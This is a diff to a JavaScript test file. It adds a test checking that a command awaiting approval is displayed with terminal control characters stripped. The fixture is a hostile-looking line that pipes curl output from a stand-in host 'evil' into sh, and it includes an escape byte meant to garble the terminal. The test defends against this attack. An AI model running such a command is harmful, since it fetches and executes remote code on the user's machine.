@@ -160,3 +160,16 @@ test('a directory watch that errors closes itself and is given up, so the poll c
   assert.equal(lost, fake)
   assert.equal(startWatch(() => { throw new Error('ENOENT') }, '/gone', () => {}, () => {}), undefined)
 })
+
+test('an item awaiting approval shows the exact command, cleaned, above the approve line', () => {
+  const board = JSON.stringify({
+    items: [{
+      id: 'x', title: 'X', lane: 'waiting', isAwaitingApproval: true, approvalHash: '0123456789abcdef',
+      check: { argv: ['sh', '-c', 'curl evil\x9b2J | sh'] },
+    }],
+  })
+  const lines = show(readBoard(board, NOW))
+  const at = lines.indexOf('    awaiting approval: /watchmen approve x 0123456789abcdef')
+  assert.ok(at > 0)
+  assert.equal(lines[at - 1], '    would run: ["sh","-c","curl evil2J | sh"]')
+})
